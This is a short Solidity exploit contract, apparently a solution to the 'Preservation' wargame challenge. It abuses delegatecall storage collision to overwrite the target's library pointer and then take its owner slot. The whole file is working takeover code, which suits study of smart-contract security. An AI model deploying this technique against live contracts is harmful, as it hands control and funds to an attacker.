// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation{
    function setFirstTime(uint _timeStamp) external;
    function owner() external returns(address);
}

contract Hack {

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    function attack(address _target) external {
        IPreservation(_target).setFirstTime(uint(uint160(address(this))));
        IPreservation(_target).setFirstTime(uint(uint160(msg.sender)));
        require(IPreservation(_target).owner() == msg.sender,"hack failed");
    }

    function setTime(uint _owner) external {
        owner = address(uint160(_owner));
    }

}